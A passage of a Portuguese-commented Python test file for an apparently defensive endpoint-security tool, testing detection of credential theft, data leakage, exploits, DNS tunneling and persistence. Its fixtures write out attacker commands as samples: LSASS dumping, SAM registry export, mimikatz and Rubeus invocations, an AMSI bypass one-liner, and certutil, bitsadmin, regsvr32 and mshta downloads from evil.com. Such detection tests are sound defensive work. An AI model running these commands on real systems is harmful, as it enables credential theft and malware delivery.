            self.assertIn(f'id="{element_id}"', html, f"elemento do painel ausente no dashboard: {element_id}")

        # O JS do dashboard deve consumir o novo endpoint
        self.assertIn("fetchSystemResources()", html)
        self.assertIn("fetch('/api/system/resources')", html)
        self.assertIn("scanFileNow()", html)
        self.assertIn("whitelistEnteredPath()", html)


class TestFunctionsEngineAPI(unittest.TestCase):
    """Testes dos endpoints do Functions Engine (100+ funções estilo Zabbix)."""

    def setUp(self):
        self.client = app.test_client()

    def test_01_functions_status_and_list(self):
        res = self.client.get("/api/functions/status")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertEqual(data.get("status"), "success")
        self.assertGreaterEqual(data.get("total_functions", 0), 50)
        self.assertGreaterEqual(len(data.get("categories", [])), 5)

        res = self.client.get("/api/functions/list")
        data = res.get_json()
        self.assertEqual(len(data.get("functions", [])), data.get("count"))
        self.assertGreaterEqual(data.get("count", 0), 50)

    def test_02_functions_demo_evaluate_and_trigger(self):
        res = self.client.post("/api/functions/metrics/demo")
        self.assertEqual(res.status_code, 200)
        self.assertEqual(res.get_json().get("status"), "success")

        res = self.client.post("/api/functions/evaluate", json={"expression": 'last("system.cpu.util")'})
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertEqual(data.get("status"), "success")
        self.assertEqual(data.get("result"), 95)

        res = self.client.post("/api/functions/trigger", json={"expression": 'last("system.cpu.util") > 90'})
        self.assertEqual(res.status_code, 200)
        self.assertTrue(res.get_json().get("fired"))

        res = self.client.post("/api/functions/evaluate", json={"expression": 'funcao_inexistente("x")'})
        self.assertEqual(res.status_code, 400)
        self.assertIn("error", res.get_json())

    def test_03_functions_ingest_items_clear(self):
        res = self.client.post("/api/functions/ingest", json={"item_id": "test.metric", "value": 42})
        self.assertEqual(res.status_code, 200)
        self.assertEqual(res.get_json().get("ingested"), 1)

        res = self.client.post("/api/functions/evaluate", json={"expression": 'last("test.metric")'})
        self.assertEqual(res.status_code, 200)
        self.assertEqual(res.get_json().get("result"), 42)

        res = self.client.get("/api/functions/items?limit=10")
        self.assertEqual(res.status_code, 200)
        self.assertGreaterEqual(res.get_json().get("count", 0), 1)

        res = self.client.post("/api/functions/clear")
        self.assertEqual(res.status_code, 200)
        self.assertGreaterEqual(res.get_json().get("cleared", 0), 1)


class TestIdentityCredentialGuard(unittest.TestCase):
    """Suite de testes para o motor de Proteção de Identidade e Credenciais (LSASS Armor & PrivEsc Guard)."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.db_path = os.path.join(self.temp_dir, "test_events.db")
        self.key_path = os.path.join(self.temp_dir, "test.key")
        self.quarantine_dir = os.path.join(self.temp_dir, "quarantine")

        self.logger = SecurityEventLogger(self.db_path)
        self.vault = CryptoVault(self.key_path)
        self.soar = AutoResponseEngine(self.logger, self.vault, self.quarantine_dir)
        self.guard = IdentityCredentialGuard(logger=self.logger, soar=self.soar)
        self.client = app.test_client()

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_01_rules_and_mitre_coverage(self):
        """Valida se as regras cobrem as principais técnicas MITRE de roubo de credenciais."""
        status = self.guard.get_status()
        self.assertEqual(status["status"], "ACTIVE_DEFENSE")
        self.assertGreaterEqual(status["rules_loaded"], 15)

        mitre_techniques = {r["mitre"] for r in self.guard.CREDENTIAL_THEFT_RULES}
        self.assertIn("T1003.001", mitre_techniques)  # LSASS Memory Dumping
        self.assertIn("T1003.002", mitre_techniques)  # SAM Hive Extraction
        self.assertIn("T1134", mitre_techniques)      # Token Impersonation / Potato
        self.assertIn("T1558", mitre_techniques)      # Kerberoasting

    def test_02_lsass_handle_inspection(self):
        """Valida se tentativas de abrir LSASS com permissões perigosas são bloqueadas."""
        # Tentativa de leitura de VM (Dumping)
        is_threat = self.guard.inspect_lsass_handle_access(caller_pid=99999, access_mask=IdentityCredentialGuard.PROCESS_VM_READ)
        self.assertTrue(is_threat)

        # Tentativa com PROCESS_ALL_ACCESS
        is_threat_all = self.guard.inspect_lsass_handle_access(caller_pid=99999, access_mask=IdentityCredentialGuard.PROCESS_ALL_ACCESS)
        self.assertTrue(is_threat_all)

        # Permissão benigna sem leitura/modificação de memória
        is_threat_benign = self.guard.inspect_lsass_handle_access(caller_pid=99999, access_mask=0x0001)
        self.assertFalse(is_threat_benign)

    def test_03_heuristic_signatures_matching(self):
        """Valida correspondência das assinaturas com comandos reais de invasores."""
        sample_malicious_commands = [
            ("rundll32.exe C:\\windows\\System32\\comsvcs.dll, #24 640 full", "ID_LSASS_COMSVCS_ORDINAL"),
            ("procdump.exe -ma lsass.exe lsass.dmp", "ID_LSASS_PROCDUMP"),
            ("reg.exe save HKLM\\SAM C:\\temp\\sam.save", "ID_REG_SAVE_SAM"),
            ("reg save HKLM\\SYSTEM C:\\temp\\sys.save", "ID_REG_SAVE_SYSTEM"),
            ("esentutl.exe /y /vss C:\\Windows\\System32\\config\\SAM", "ID_ESENTUTL_VSS_SAM"),
            ("GodPotato-NET4.exe -cmd \"whoami\"", "ID_POTATO_EXPLOIT_FAMILY"),
            ("Rubeus.exe kerberoast /outfile:hashes.txt", "ID_RUBEUS_KERBEROS_ROAST"),
            ("mimikatz.exe \"sekurlsa::logonpasswords\" exit", "ID_MIMIKATZ_SEKURLSA")
        ]

        for cmd, expected_rule in sample_malicious_commands:
            matched = False
            cmd_lower = cmd.lower()
            for rule in self.guard.CREDENTIAL_THEFT_RULES:
                keywords = rule["keywords"]
                mode = rule.get("match_mode", "all")
                matched_rule = any(kw in cmd_lower for kw in keywords) if mode == "any" else all(kw in cmd_lower for kw in keywords)
                if matched_rule:
                    self.assertEqual(rule["id"], expected_rule, f"Falha na regra para: {cmd}")
                    matched = True
                    break
            self.assertTrue(matched, f"Comando não foi detectado pelas regras: {cmd}")

    def test_04_token_privilege_audit(self):
        """Valida que o método de auditoria de tokens executa com integridade."""
        suspicious = self.guard.audit_token_privileges()
        self.assertIsInstance(suspicious, list)

    def test_05_api_identity_guard_endpoints(self):
        """Valida a disponibilidade e respostas dos endpoints REST da API."""
        # 1. Status
        res = self.client.get("/api/identity-guard/status")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertEqual(data.get("status"), "ACTIVE_DEFENSE")

        # 2. Varredura sob demanda
        res_scan = self.client.post("/api/identity-guard/scan")
        self.assertEqual(res_scan.status_code, 200)
        scan_data = res_scan.get_json()
        self.assertEqual(scan_data.get("status"), "success")
        self.assertIn("threats_found_count", scan_data)

        # 3. Auditoria de privilégios de tokens
        res_priv = self.client.post("/api/identity-guard/audit-privileges")
        self.assertEqual(res_priv.status_code, 200)
        priv_data = res_priv.get_json()
        self.assertEqual(priv_data.get("status"), "success")

        # 4. Histórico de ameaças
        res_threats = self.client.get("/api/identity-guard/threats")
        self.assertEqual(res_threats.status_code, 200)
        self.assertEqual(res_threats.get_json().get("status"), "success")


class TestDLPExfiltrationGuard(unittest.TestCase):
    """Suite de testes para o motor de Proteção contra Perda de Dados e Exfiltração (DLP & USB Armor)."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.db_path = os.path.join(self.temp_dir, "test_events.db")
        self.key_path = os.path.join(self.temp_dir, "test.key")
        self.quarantine_dir = os.path.join(self.temp_dir, "quarantine")

        self.logger = SecurityEventLogger(self.db_path)
        self.vault = CryptoVault(self.key_path)
        self.soar = AutoResponseEngine(self.logger, self.vault, self.quarantine_dir)
        self.dlp = DLPExfiltrationGuard(logger=self.logger, soar=self.soar)
        self.client = app.test_client()

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_01_cpf_and_cnpj_validation(self):
        """Valida precisão do cálculo de dígito verificador Módulo 11 para CPFs e CNPJs."""
        # CPF válido conhecido
        valid_cpf = "529.982.247-25"
        self.assertTrue(DLPPatternMatcher.validate_cpf(valid_cpf))

        # CPFs inválidos (dígito errado e dígitos repetidos)
        self.assertFalse(DLPPatternMatcher.validate_cpf("111.111.111-11"))
        self.assertFalse(DLPPatternMatcher.validate_cpf("123.456.789-00"))

        # CNPJ válido
        valid_cnpj = "11.222.333/0001-81"
        self.assertTrue(DLPPatternMatcher.validate_cnpj(valid_cnpj))
        self.assertFalse(DLPPatternMatcher.validate_cnpj("00.000.000/0000-00"))
        self.assertFalse(DLPPatternMatcher.validate_cnpj("11.222.333/0001-99"))

    def test_02_luhn_credit_card_validation(self):
        """Valida que cartões de crédito são filtrados rigorosamente via Algoritmo de Luhn."""
        valid_visa = "4532 0151 1283 0366"
        self.assertTrue(DLPPatternMatcher.validate_luhn(valid_visa))

        # Sequência repetida ou dígito inválido
        self.assertFalse(DLPPatternMatcher.validate_luhn("0000 0000 0000 0000"))
        self.assertFalse(DLPPatternMatcher.validate_luhn("4532 0151 1283 0367"))

    def test_03_deep_content_secrets_inspection(self):
        """Valida detecção simultânea de credenciais de infraestrutura e PII em texto."""
        sample_leak_text = """
        Confidential Deployment Script
        AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"
        PRIVATE_KEY: -----BEGIN RSA PRIVATE KEY-----
        MIIEowIBAAKCAQEA0Y...
        -----END RSA PRIVATE KEY-----
        DATABASE_URL = "postgres://admin:SecretPassword123@db.internal:5432/corp"
        Client CPF: 529.982.247-25
        Credit Card: 4532-0151-1283-0366
        """

        report = self.dlp.inspect_text(sample_leak_text)
        self.assertEqual(report["status"], "SENSITIVE_DATA_DETECTED")
        self.assertGreaterEqual(report["findings_count"], 4)

        types_found = {f["type"] for f in report["findings"]}
        self.assertIn("AWS_CREDENTIAL", types_found)
        self.assertIn("PRIVATE_KEY", types_found)
        self.assertIn("BRAZILIAN_CPF", types_found)
        self.assertIn("CREDIT_CARD", types_found)

    def test_04_usb_policy_and_audit(self):
        """Valida alternância e auditoria de políticas de mídias removíveis."""
        res_policy = self.dlp.set_usb_policy("READ_ONLY")
        self.assertEqual(res_policy["status"], "SUCCESS")
        self.assertEqual(self.dlp.usb_policy, "READ_ONLY")

        audit = self.dlp.audit_usb_storage()
        self.assertEqual(audit["status"], "success")
        self.assertEqual(audit["usb_policy"], "READ_ONLY")
        self.assertIn("removable_drives_count", audit)

    def test_05_dlp_api_endpoints(self):
        """Valida disponibilidade e respostas dos endpoints REST de DLP."""
        # 1. Status
        res_status = self.client.get("/api/dlp/status")
        self.assertEqual(res_status.status_code, 200)
        data = res_status.get_json()
        self.assertEqual(data.get("status"), "ACTIVE_DEFENSE")
        self.assertIn("usb_policy", data)

        # 2. Inspecionar Texto
        res_inspect = self.client.post("/api/dlp/inspect-text", json={"text": "Client CPF: 529.982.247-25"})
        self.assertEqual(res_inspect.status_code, 200)
        self.assertEqual(res_inspect.get_json().get("status"), "SENSITIVE_DATA_DETECTED")

        # 3. Alterar Política de USB
        res_usb = self.client.post("/api/dlp/usb-policy", json={"policy": "READ_ONLY"})
        self.assertEqual(res_usb.status_code, 200)
        self.assertEqual(res_usb.get_json().get("status"), "SUCCESS")

        # 4. Varredura de Exfiltração
        res_scan = self.client.post("/api/dlp/scan-exfiltration")
        self.assertEqual(res_scan.status_code, 200)
        self.assertEqual(res_scan.get_json().get("status"), "success")

        # 5. Histórico de Eventos DLP
        res_events = self.client.get("/api/dlp/events")
        self.assertEqual(res_events.status_code, 200)
        self.assertEqual(res_events.get_json().get("status"), "success")


class TestExecutionAntiExploitGuard(unittest.TestCase):
    """Suite de testes para o motor de Execução & Anti-Exploit / Anti-Hollowing."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.db_path = os.path.join(self.temp_dir, "test_events.db")
        self.key_path = os.path.join(self.temp_dir, "test.key")
        self.quarantine_dir = os.path.join(self.temp_dir, "quarantine")

        self.logger = SecurityEventLogger(self.db_path)
        self.vault = CryptoVault(self.key_path)
        self.soar = AutoResponseEngine(self.logger, self.vault, self.quarantine_dir)
        self.guard = ExecutionAntiExploitGuard(logger=self.logger, soar=self.soar)
        self.client = app.test_client()

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_01_office_child_process_blocking(self):
        """Valida que processos de escritório (Word/Excel/Acrobat) gerando interpretadores são bloqueados."""
        # 1. Word gerando PowerShell (Macro maliciosa / Exploit)
        res_word = self.guard.evaluate_synthetic_execution("winword.exe", "powershell.exe")
        self.assertTrue(res_word["is_exploit"])
        self.assertEqual(res_word["rule"], "OFFICE_SPAWNED_SHELL_EXPLOIT")
        self.assertEqual(res_word["severity"], "CRITICAL")

        # 2. Excel gerando CMD
        res_excel = self.guard.evaluate_synthetic_execution("excel.exe", "cmd.exe")
        self.assertTrue(res_excel["is_exploit"])

        # 3. Acrobat gerando mshta
        res_pdf = self.guard.evaluate_synthetic_execution("acrord32.exe", "mshta.exe")
        self.assertTrue(res_pdf["is_exploit"])

        # 4. Execução benigna (Explorer gerando notepad)
        res_benign = self.guard.evaluate_synthetic_execution("explorer.exe", "notepad.exe")
        self.assertFalse(res_benign["is_exploit"])

    def test_02_process_hollowing_masquerading(self):
        """Valida detecção de processos críticos executando fora do System32 (Masquerading / Hollowing)."""
        # 1. svchost falso rodando na pasta pública de usuários
        res_fake_svchost = self.guard.evaluate_synthetic_execution(
            parent_name="cmd.exe",
            child_name="svchost.exe",
            child_exe="C:\\Users\\Public\\svchost.exe"
        )
        self.assertTrue(res_fake_svchost["is_exploit"])
        self.assertEqual(res_fake_svchost["rule"], "PROCESS_HOLLOWING_MASQUERADING")

        # 2. svchost legítimo no System32
        res_valid_svchost = self.guard.evaluate_synthetic_execution(
            parent_name="services.exe",
            child_name="svchost.exe",
            child_exe="C:\\Windows\\System32\\svchost.exe"
        )
        self.assertFalse(res_valid_svchost["is_exploit"])

    def test_03_amsi_etw_tampering(self):
        """Valida bloqueio de scripts PowerShell tentando cegar o AMSI ou ETW."""
        cmd_amsi = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
        res_amsi = self.guard.evaluate_synthetic_execution("powershell.exe", "powershell.exe", child_cmdline=cmd_amsi)
        self.assertTrue(res_amsi["is_exploit"])
        self.assertEqual(res_amsi["rule"], "AMSI_BYPASS_REFLECTION")

        cmd_scanbuffer = "function Patch-Amsi { [Byte[]]$Patch = 0xc3; VirtualProtect(AmsiScanBuffer) }"
        res_patch = self.guard.evaluate_synthetic_execution("powershell.exe", "powershell.exe", child_cmdline=cmd_scanbuffer)
        self.assertTrue(res_patch["is_exploit"])
        self.assertEqual(res_patch["rule"], "AMSI_SCANBUFFER_PATCH")

    def test_04_status_and_shields(self):
        """Valida estrutura de status e escudos do motor anti-exploit."""
        status = self.guard.get_status()
        self.assertEqual(status["status"], "HARDENED_ACTIVE")
        self.assertTrue(status["active_shields"]["office_pdf_shield"])
        self.assertTrue(status["active_shields"]["anti_hollowing"])
        self.assertGreater(len(status["vulnerable_parent_apps_protected"]), 5)

    def test_05_anti_exploit_api_endpoints(self):
        """Valida endpoints REST de Anti-Exploit."""
        # 1. Status
        res_status = self.client.get("/api/anti-exploit/status")
        self.assertEqual(res_status.status_code, 200)
        data = res_status.get_json()
        self.assertEqual(data.get("status"), "HARDENED_ACTIVE")

        # 2. Simular Exploit
        res_sim = self.client.post("/api/anti-exploit/simulate-exploit", json={"parent": "winword.exe", "child": "powershell.exe"})
        self.assertEqual(res_sim.status_code, 200)
        self.assertTrue(res_sim.get_json().get("is_exploit"))

        # 3. Varredura no SO
        res_scan = self.client.post("/api/anti-exploit/scan")
        self.assertEqual(res_scan.status_code, 200)
        self.assertEqual(res_scan.get_json().get("status"), "success")

        # 4. Histórico de Eventos
        res_events = self.client.get("/api/anti-exploit/events")
        self.assertEqual(res_events.status_code, 200)
        self.assertEqual(res_events.get_json().get("status"), "success")


class TestNetworkPerimeterGuard(unittest.TestCase):
    """Suite de testes para o motor de Rede e Perímetro Local (DGA, ARP Spoofing & DNS Tunneling)."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.db_path = os.path.join(self.temp_dir, "test_events.db")
        self.key_path = os.path.join(self.temp_dir, "test.key")
        self.quarantine_dir = os.path.join(self.temp_dir, "quarantine")

        self.logger = SecurityEventLogger(self.db_path)
        self.vault = CryptoVault(self.key_path)
        self.soar = AutoResponseEngine(self.logger, self.vault, self.quarantine_dir)
        self.guard = NetworkPerimeterGuard(logger=self.logger, soar=self.soar)
        from sentinel_api import init_api
        init_api(perimeter_guard=self.guard)
        self.client = app.test_client()

    def tearDown(self):
        from sentinel_api import init_api, perimeter_guard
        init_api(perimeter_guard=perimeter_guard)
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_01_dga_detection(self):
        """Valida que domínios com alta entropia estocástica de Shannon são identificados como DGA de C2."""
        # 1. Domínio DGA sintético (botnet / ransomware C2)
        dga_domain = "ax7b9kql0mzpqr.biz"
        res_dga = self.guard.inspect_dns_query(dga_domain)
        self.assertEqual(res_dga["status"], "DGA_C2_DETECTED")
        self.assertEqual(res_dga["mitre"], "T1568.002")
        self.assertGreaterEqual(res_dga["entropy"], 3.5)

        # 2. Domínio legítimo comum (Google)
        legit_domain = "google.com"
        res_legit = self.guard.inspect_dns_query(legit_domain)
        self.assertEqual(res_legit["status"], "CLEAN")
        self.assertEqual(res_legit["classification"], "LEGITIMATE")

    def test_02_dns_tunneling_detection(self):
        """Valida que consultas DNS com payloads embutidos são identificadas como DNS Tunneling."""
        # Payload com subdomínio longo de exfiltração
        tunnel_domain = "c3NoLWV4ZmlsdHJhdGlvbi1kYXRhLXBheWxvYWQxMjM0NTY3ODk.evil.com"
        res_tunnel = self.guard.inspect_dns_query(tunnel_domain)
        self.assertEqual(res_tunnel["status"], "DNS_TUNNELING_DETECTED")
        self.assertEqual(res_tunnel["mitre"], "T1071.004")
        self.assertEqual(res_tunnel["severity"], "CRITICAL")

    def test_03_arp_spoofing_mitm_detection(self):
        """Valida detecção de duplicatas de endereço MAC (ataque Man-in-the-Middle via ARP Poisoning)."""
        # Saída ARP simulada contendo envenenamento (o Gateway 192.168.1.1 e o IP do atacante 192.168.1.50 têm o mesmo MAC)
        poisoned_arp_output = """
        Interface: 192.168.1.100 --- 0x3
          Endereço IP           Endereço Físico       Tipo
          192.168.1.1           00-11-22-33-44-55     dinâmico
          192.168.1.50          00-11-22-33-44-55     dinâmico
          192.168.1.20          aa-bb-cc-dd-ee-ff     dinâmico
        """
        report_attack = self.guard.audit_arp_table(custom_arp_output=poisoned_arp_output)
        self.assertEqual(report_attack["status"], "MITM_ATTACK_DETECTED")
        self.assertGreaterEqual(report_attack["alerts_count"], 1)
        alert = report_attack["alerts"][0]
        self.assertEqual(alert["mac"], "00:11:22:33:44:55")
        self.assertIn("192.168.1.1", alert["conflicting_ips"])
        self.assertIn("192.168.1.50", alert["conflicting_ips"])

        # Saída ARP saudável (sem duplicatas)
        clean_arp_output = """
        Interface: 192.168.1.100 --- 0x3
          Endereço IP           Endereço Físico       Tipo
          192.168.1.1           00-11-22-33-44-55     dinâmico
          192.168.1.20          aa-bb-cc-dd-ee-ff     dinâmico
        """
        report_clean = self.guard.audit_arp_table(custom_arp_output=clean_arp_output)
        self.assertEqual(report_clean["status"], "HEALTHY")
        self.assertEqual(report_clean["alerts_count"], 0)

    def test_04_hosts_file_and_listeners(self):
        """Valida auditoria do arquivo hosts e portas de escuta."""
        hosts_audit = self.guard.audit_hosts_file()
        self.assertIn(hosts_audit.get("status"), ["INTEACT", "HOSTS_FILE_HIJACKED", "NOT_FOUND"])

        listeners = self.guard.audit_network_listeners()
        self.assertIsInstance(listeners, list)

    def test_05_perimeter_api_endpoints(self):
        """Valida endpoints REST do Perimeter Guard."""
        # 1. Status
        res_status = self.client.get("/api/perimeter-guard/status")
        self.assertEqual(res_status.status_code, 200)
        data = res_status.get_json()
        self.assertEqual(data.get("status"), "ACTIVE_DEFENSE")
        self.assertTrue(data.get("active_shields", {}).get("dga_armor"))

        # 2. Inspecionar DNS
        res_dns = self.client.post("/api/perimeter-guard/inspect-dns", json={"domain": "google.com"})
        self.assertEqual(res_dns.status_code, 200)
        self.assertEqual(res_dns.get_json().get("status"), "CLEAN")

        # 3. Auditar ARP
        res_arp = self.client.post("/api/perimeter-guard/audit-arp", json={})
        self.assertEqual(res_arp.status_code, 200)

        # 4. Eventos
        res_events = self.client.get("/api/perimeter-guard/events")
        self.assertEqual(res_events.status_code, 200)
        self.assertEqual(res_events.get_json().get("status"), "success")


class TestPosturePersistenceGuard(unittest.TestCase):
    """Suite de testes para o motor de Postura, Persistência e LOLBins."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.db_path = os.path.join(self.temp_dir, "test_events.db")
        self.key_path = os.path.join(self.temp_dir, "test.key")
        self.quarantine_dir = os.path.join(self.temp_dir, "quarantine")

        self.logger = SecurityEventLogger(self.db_path)
        self.vault = CryptoVault(self.key_path)
        self.soar = AutoResponseEngine(self.logger, self.vault, self.quarantine_dir)
        self.guard = PosturePersistenceGuard(logger=self.logger, soar=self.soar)
        self.client = app.test_client()

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_01_lolbin_abuse_detection(self):
        """Valida detecção de abuso de binários legítimos do sistema operacional (LOLBins)."""
        # 1. Certutil com download furtivo (-urlcache -split)
        res_certutil = self.guard.evaluate_lolbin_command(
            "certutil.exe", "certutil.exe -urlcache -split -f http://evil-payload.com/trojan.exe payload.exe"
        )
        self.assertTrue(res_certutil["is_lolbin_abuse"])
        self.assertEqual(res_certutil["rule"], "LOLBIN_CERTUTIL_DOWNLOAD")
        self.assertEqual(res_certutil["mitre"], "T1105")

        # 2. BITSAdmin download
        res_bits = self.guard.evaluate_lolbin_command(
            "bitsadmin.exe", "bitsadmin /transfer job1 /download /priority high http://evil.com/x.dll C:\\x.dll"
        )
        self.assertTrue(res_bits["is_lolbin_abuse"])

        # 3. Regsvr32 Squiblydoo
        res_reg = self.guard.evaluate_lolbin_command(
            "regsvr32.exe", "regsvr32 /s /u /i:http://evil.com/script.sct scrobj.dll"
        )
        self.assertTrue(res_reg["is_lolbin_abuse"])
        self.assertEqual(res_reg["rule"], "LOLBIN_REGSVR32_SQUIBLYDOO")

        # 4. Mshta script remoto
        res_mshta = self.guard.evaluate_lolbin_command(
            "mshta.exe", "mshta.exe vbscript:Close(Execute(\"GetObject(\"\"script:http://evil.com/a.sct\"\")\"))"
        )
        self.assertTrue(res_mshta["is_lolbin_abuse"])

        # 5. Comando benigno (Certutil calculando hash)
        res_benign = self.guard.evaluate_lolbin_command(
            "certutil.exe", "certutil.exe -hashfile C:\\Windows\\notepad.exe SHA256"
        )
        self.assertFalse(res_benign["is_lolbin_abuse"])

    def test_02_synthetic_persistence_evaluation(self):
        """Valida detecção de persistências em pastas proibidas ou via técnicas maliciosas."""
        # 1. Executável em AppData Temp configurado na chave Run
        res_temp = self.guard.evaluate_synthetic_persistence(
            "SecurityUpdate",
            "C:\\Users\\User\\AppData\\Local\\Temp\\updater.exe",
            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        )
        self.assertTrue(res_temp["is_suspicious"])
        self.assertIn("appdata\\local\\temp", res_temp["reasons"][0].lower())

        # 2. Persistência executando VBS ou script oculto
        res_script = self.guard.evaluate_synthetic_persistence(
            "PayloadVBS",
            "wscript.exe C:\\Users\\Public\\malware.vbs",
            "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        )
        self.assertTrue(res_script["is_suspicious"])

        # 3. IFEO Debugger Hijack
        res_ifeo = self.guard.evaluate_synthetic_persistence(
            "Debugger",
            "C:\\evil.exe",
            "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe"
        )
        self.assertTrue(res_ifeo["is_suspicious"])

        # 4. Entrada benigna em Program Files
        res_clean = self.guard.evaluate_synthetic_persistence(
            "MicrosoftEdge",
            "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-startup-window",
            "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        )
        self.assertFalse(res_clean["is_suspicious"])

    def test_03_asep_and_hardening_auditor(self):
        """Valida execução da varredura de ASEP e auditoria de postura CIS."""
        asep_report = self.guard.scan_asep_registry_and_files()
        self.assertIn(asep_report["status"], ["CLEAN", "THREATS_DETECTED"])
        self.assertIsInstance(asep_report["entries_analyzed"], int)

        hardening = self.guard.audit_system_hardening()
        self.assertGreaterEqual(hardening["posture_score"], 0)
        self.assertLessEqual(hardening["posture_score"], 100)
        self.assertIn(hardening["posture_rating"], ["EXCELLENT", "MODERATE", "CRITICAL"])
        self.assertGreaterEqual(len(hardening["checks"]), 3)

    def test_04_status_and_shields(self):
        """Valida integridade do status e escudos do motor de postura."""
        status = self.guard.get_status()
        self.assertEqual(status["status"], "HARDENED_ACTIVE")
        self.assertTrue(status["active_shields"]["asep_hunter"])
        self.assertTrue(status["active_shields"]["lolbin_monitor"])

    def test_05_posture_api_endpoints(self):
        """Valida endpoints REST de Postura e Persistência."""
        # 1. Status
        res_status = self.client.get("/api/posture-guard/status")
        self.assertEqual(res_status.status_code, 200)
        data = res_status.get_json()
        self.assertEqual(data.get("status"), "HARDENED_ACTIVE")
        self.assertIn("posture_score", data)

        # 2. Inspecionar LOLBin
        res_lolbin = self.client.post("/api/posture-guard/inspect-lolbin", json={
            "process_name": "certutil.exe",
            "cmdline": "certutil -urlcache -split -f http://evil.com/payload.exe"
        })
        self.assertEqual(res_lolbin.status_code, 200)
        self.assertTrue(res_lolbin.get_json().get("is_lolbin_abuse"))

        # 3. Varredura ASEP
        res_asep = self.client.post("/api/posture-guard/scan-asep")
        self.assertEqual(res_asep.status_code, 200)

        # 4. Auditoria de Hardening
        res_hard = self.client.post("/api/posture-guard/audit-posture")
        self.assertEqual(res_hard.status_code, 200)

        # 5. Eventos
        res_events = self.client.get("/api/posture-guard/events")
        self.assertEqual(res_events.status_code, 200)
        self.assertEqual(res_events.get_json().get("status"), "success")

    def test_06_protection_diagnostics_endpoint(self):
        """Valida que o endpoint de diagnóstico retorna com sucesso todas as camadas soberanas."""
        res = self.client.get("/api/protection/diagnostics")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertEqual(data.get("status"), "success")
        # A matriz soberana evoluiu de 20 para 25 camadas; o teste valida a consistência
        # dinâmica do próprio endpoint em vez de um literal frágil.
        total_layers = data.get("total_layers")
        active_layers = data.get("active_layers")
        self.assertGreaterEqual(total_layers, 20)
        self.assertEqual(active_layers, total_layers)
        self.assertEqual(data.get("overall_health"), 100)
        subsystems = data.get("subsystems", [])
        self.assertEqual(len(subsystems), total_layers)
        for sub in subsystems:
            self.assertEqual(sub.get("status"), "OPERACIONAL")
            self.assertEqual(sub.get("health"), 100)

    def test_07_functions_alarms_and_telemetry_endpoints(self):
        """Valida os novos endpoints do Functions Engine: alarmes, presets e coleta de telemetria."""
        # 1. Presets
        res_presets = self.client.get("/api/functions/presets")
        self.assertEqual(res_presets.status_code, 200)
        self.assertGreaterEqual(res_presets.get_json().get("count", 0), 3)

        # 2. Coleta de telemetria
        res_collect = self.client.post("/api/functions/collect")
        self.assertEqual(res_collect.status_code, 200)
        self.assertEqual(res_collect.get_json().get("status"), "success")

        # 3. Cadastro de regra de alarme
        res_reg = self.client.post("/api/functions/alarms/register", json={
            "name": "Alarme Teste API",
            "expression": 'last("sentinel.active_layers.count") >= 20',
            "severity": "INFO",
            "description": "Teste automatizado de integridade"
        })
        self.assertEqual(res_reg.status_code, 200)
        rule_id = res_reg.get_json().get("rule", {}).get("id")
        self.assertIsNotNone(rule_id)

        # 4. Consulta de alarmes
        res_alarms = self.client.get("/api/functions/alarms")
        self.assertEqual(res_alarms.status_code, 200)
        self.assertEqual(res_alarms.get_json().get("status"), "success")
        self.assertIn("rules", res_alarms.get_json())

        # 5. Remoção de regra de alarme
        res_del = self.client.post("/api/functions/alarms/delete", json={"rule_id": rule_id})
        self.assertEqual(res_del.status_code, 200)
        self.assertEqual(res_del.get_json().get("status"), "success")

        # 6. Sumário de telemetria estruturado para gráficos
        res_summary = self.client.get("/api/functions/telemetry/summary")
        self.assertEqual(res_summary.status_code, 200)
        sum_json = res_summary.get_json()
        self.assertEqual(sum_json.get("status"), "success")
        self.assertIn("metrics", sum_json)
        self.assertGreater(sum_json.get("total_metrics", 0), 0)

    def test_08_wal_retention_and_vacuum_endpoints(self):
        """Valida modos WAL, retenção e compactação VACUUM do banco de dados SQLite."""
        # 1. Testar endpoint de vacuum
        res_vac = self.client.post("/api/logs/vacuum")
        self.assertEqual(res_vac.status_code, 200)
        self.assertEqual(res_vac.get_json().get("status"), "success")

        # 2. Testar endpoint de purge
        res_purge = self.client.post("/api/logs/purge", json={"days": 30, "max_records": 10000})
        self.assertEqual(res_purge.status_code, 200)
        self.assertEqual(res_purge.get_json().get("status"), "success")
        self.assertIn("purged_events", res_purge.get_json())

    def test_09_defense_mode_and_forensic_report_endpoints(self):
        """Valida os modos de defesa (STANDARD, ELEVATED, LOCKDOWN) e exportação de relatório forense."""
        # 1. Consulta inicial do modo
        res_mode = self.client.get("/api/defense/mode")
        self.assertEqual(res_mode.status_code, 200)
        self.assertEqual(res_mode.get_json().get("status"), "success")

        # 2. Alteração para ELEVATED
        res_elevated = self.client.post("/api/defense/mode", json={"mode": "ELEVATED"})
        self.assertEqual(res_elevated.status_code, 200)
        self.assertEqual(res_elevated.get_json().get("mode"), "ELEVATED")

        # 3. Alteração para STANDARD
        res_std = self.client.post("/api/defense/mode", json={"mode": "STANDARD"})
        self.assertEqual(res_std.status_code, 200)
        self.assertEqual(res_std.get_json().get("mode"), "STANDARD")

        # 4. Consulta de Relatório Forense Executivo (JSON)
        res_rep = self.client.get("/api/reports/forensic")
